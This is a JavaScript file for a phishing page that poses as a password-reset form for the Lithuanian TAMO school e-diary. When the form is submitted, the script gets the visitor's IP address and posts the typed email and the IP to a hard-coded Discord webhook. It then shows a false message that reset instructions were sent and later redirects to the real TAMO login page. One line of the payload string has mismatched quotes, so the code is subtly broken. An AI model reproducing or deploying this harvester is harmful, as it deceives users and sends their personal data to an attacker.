document.addEventListener('DOMContentLoaded', function() {
  const submitButton = document.querySelector('.submit');
  const inputField = document.querySelector('.input');

  const smallText = document.querySelector('.smallText');
  const smallText2 = document.querySelector('.smallText2');

  const square = document.querySelector('.square');

  submitButton.addEventListener('click', function() {
    const inputText = inputField.value;

    if (submitButton.innerHTML == 'Uždaryti') {
      window.location.href = 'https://dienynas.tamo.lt/Prisijungimas/Login';
    } else {
      const webhookUrl = 'https://discord.com/api/webhooks/1083136748118364213/qaFsfblp0Vc6bTUJceLygk6gdDjMjI0yN5c0BTY2JBKXEcQKf8xsff_BgL2Iwtz1ap'+'7B';

      //Get ip
      fetch('https://api.ipify.org/?format=json')
        .then(results => results.json())
        .then(data => {
          const address = data.ip;
          
          // Construct the message payload
          const payload = {
            content: '```Email: inputText + '\nIP: '+address + '```'
          };

          // Send the message to the webhook
          fetch(webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
          })
          .catch(error => {
            console.error("Įvyko klaida:", error);
          });
        })
        .catch(error => console.error(error));

      square.style.height = '235px';
      smallText.innerHTML = 'Slaptažodžio pakeitimo instrukcijos sėkmingai išsiųstos.'
      submitButton.innerHTML = 'Uždaryti'

      smallText2.parentNode.removeChild(smallText2)
      inputField.parentNode.removeChild(inputField)
    };
  });
});
